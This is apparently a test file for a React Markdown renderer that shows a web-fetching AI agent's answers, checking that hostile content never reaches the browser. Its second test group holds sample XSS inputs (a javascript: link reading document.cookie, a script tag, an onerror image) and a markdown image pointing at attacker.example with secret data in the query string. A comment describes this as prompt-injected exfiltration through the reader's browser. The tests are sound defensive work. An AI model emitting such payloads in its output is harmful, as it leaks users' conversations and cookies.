import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import { MarkdownContent } from '../src/app/_ui/markdown-content';

/**
 * A model's answer, rendered.
 *
 * An agent with web-fetch answers with text a stranger's page put in front of
 * it, so most of these are about what must NOT reach the browser.
 */

const render = (text: string): string =>
  renderToStaticMarkup(createElement(MarkdownContent, { text }));

describe('what renders', () => {
  it('turns the Markdown a model writes into structure instead of showing the syntax', () => {
    const html = render('### Core Skills\n\n* **AI:** RAG, `LangGraph`\n* Cloud\n\n---\n\n1. one');

    expect(html).toContain('<h3>Core Skills</h3>');
    expect(html).toContain('<strong>AI:</strong>');
    expect(html).toContain('<code>LangGraph</code>');
    expect(html).toContain('<li>Cloud</li>');
    expect(html).toContain('<hr/>');
    expect(html).toContain('<ol>');
    expect(html).not.toContain('**');
    expect(html).not.toContain('###');
  });

  it('renders a table, inside something that scrolls rather than overflowing the card', () => {
    const html = render('| a | b |\n|---|---|\n| 1 | 2 |');

    expect(html).toContain('<div data-table-wrap=""><table>');
    expect(html).toContain('<td>1</td>');
  });

  it('opens a link in a new tab that cannot reach back into the console', () => {
    const html = render('[sauloleite](https://github.com/sauloleite)');

    expect(html).toContain('href="https://github.com/sauloleite"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });
});

describe('what never reaches the browser', () => {
  it('drops a javascript: link', () => {
    const html = render('[click me](javascript:alert(document.cookie))');

    expect(html).not.toContain('javascript:');
    expect(html).toContain('click me');
  });

  it('drops raw HTML instead of rendering it', () => {
    const html = render('Hello <script>steal()</script><img src=x onerror="steal()"> there');

    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<img');
  });

  it('fetches no image: it becomes a link somebody has to choose to open', () => {
    // An injected "show this image" with the conversation in its query string
    // would otherwise leave through the reader's own browser the moment it rendered.
    const html = render('![chart](https://attacker.example/pixel.png?data=secret)');

    expect(html).not.toContain('<img');
    expect(html).toContain('href="https://attacker.example/pixel.png?data=secret"');
    expect(html).toContain('Image: chart');
  });

  it('renders nothing for an image whose address was filtered out', () => {
    expect(render('![x](javascript:alert(1))')).not.toContain('javascript:');
  });
});
